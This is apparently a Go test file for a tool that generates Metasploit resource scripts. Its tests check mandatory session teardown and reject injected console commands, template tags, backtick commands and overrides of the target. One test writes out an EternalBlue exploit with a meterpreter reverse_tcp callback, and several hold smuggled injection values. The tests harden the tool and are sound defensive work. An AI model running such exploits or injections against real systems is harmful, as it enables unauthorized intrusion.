package metasploit

import (
	"strings"
	"testing"
)

func TestBuildResourceScript(t *testing.T) {
	s, err := buildResourceScript(ModuleSpec{
		Module:  "exploit/windows/smb/ms17_010_eternalblue",
		Target:  "10.20.0.5",
		Payload: "windows/x64/meterpreter/reverse_tcp",
		Options: map[string]any{"LHOST": "10.20.0.9", "LPORT": 4444},
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"use exploit/windows/smb/ms17_010_eternalblue",
		"set RHOSTS 10.20.0.5",
		"set PAYLOAD windows/x64/meterpreter/reverse_tcp",
		"set LHOST 10.20.0.9",
		"set LPORT 4444",
		"run -z",
		"sessions -K", // mandatory teardown must be in every script
		"exit -y",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("script missing %q:\n%s", want, s)
		}
	}
}

func TestBuildResourceScriptRejectsInjection(t *testing.T) {
	// An option value carrying a newline would inject an extra console command.
	_, err := buildResourceScript(ModuleSpec{
		Module:  "exploit/x/y",
		Target:  "10.20.0.5",
		Options: map[string]any{"EVIL": "x\nsessions -u -1"},
	})
	if err == nil {
		t.Fatal("a newline in an option value must be rejected")
	}
}

func TestBuildResourceScriptRejectsTemplateAndConsoleSyntax(t *testing.T) {
	for _, value := range []string{
		"<%=6*7%>",
		"<ruby>puts(1)</ruby>",
		"value;exit-y",
		"value with spaces",
		"`id`",
	} {
		_, err := buildResourceScript(ModuleSpec{
			Module:  "auxiliary/scanner/ssh/ssh_version",
			Target:  "10.20.0.5",
			Options: map[string]any{"THREADS": value},
		})
		if err == nil {
			t.Errorf("executable resource value %q must be rejected", value)
		}
	}
}

func TestBuildResourceScriptRejectsReservedOptions(t *testing.T) {
	// RHOSTS/RHOST/PAYLOAD are set from the validated target/payload; an option that
	// re-sets them would override the authorized target after the fact.
	for _, key := range []string{"RHOSTS", "rhost", "PAYLOAD", "Rhosts"} {
		_, err := buildResourceScript(ModuleSpec{
			Module:  "exploit/x/y",
			Target:  "10.20.0.5",
			Options: map[string]any{key: "8.8.8.8"},
		})
		if err == nil {
			t.Errorf("reserved option %q must be rejected", key)
		}
	}
}

func TestStopSessionArgsRejectsUnsafeID(t *testing.T) {
	if _, err := stopSessionArgs("1"); err != nil {
		t.Errorf("a plain id should be accepted: %v", err)
	}
	for _, bad := range []string{"1; sessions -K", "1 -K", "x\ny"} {
		if _, err := stopSessionArgs(bad); err == nil {
			t.Errorf("unsafe session id %q must be rejected", bad)
		}
	}
}

func TestResourceScriptVerifiesCleanupInSameInstance(t *testing.T) {
	// Teardown must kill sessions AND then list them (same instance) so RunModule can
	// verify no session remained — a separate msfconsole could never see them.
	script, err := buildResourceScript(ModuleSpec{Module: "exploit/x/y", Target: "10.20.0.5"})
	if err != nil {
		t.Fatal(err)
	}
	kill := strings.Index(script, "sessions -K")
	list := strings.Index(script, "sessions -l")
	if kill < 0 || list < 0 || list < kill {
		t.Errorf("script must kill then list sessions in one instance:\n%s", script)
	}
}

func TestNoActiveSessions(t *testing.T) {
	if !noActiveSessions("[*] Starting\nNo active sessions.\n") {
		t.Error("an empty session list must count as verified")
	}
	if noActiveSessions("Active sessions\n  1  meterpreter  ...\n") {
		t.Error("a listed session must NOT count as verified")
	}
}
